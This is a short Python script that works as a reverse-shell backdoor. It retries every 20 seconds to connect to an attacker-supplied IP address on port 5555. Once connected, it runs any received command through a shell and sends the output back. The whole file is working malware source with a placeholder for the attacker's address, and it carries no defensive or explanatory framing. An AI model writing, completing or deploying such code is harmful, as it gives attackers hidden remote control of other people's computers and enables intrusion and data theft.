import socket
import time
import subprocess
import json

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data += s.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue

def connect():
    while True:
        time.sleep(20)
        try:
            s.connect(('MENTION YOUR IP ADDRES HERE ', 5555))
            shell()
            s.close()
            break
        except:
            pass  # Allows function to loop and reconnect

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect()
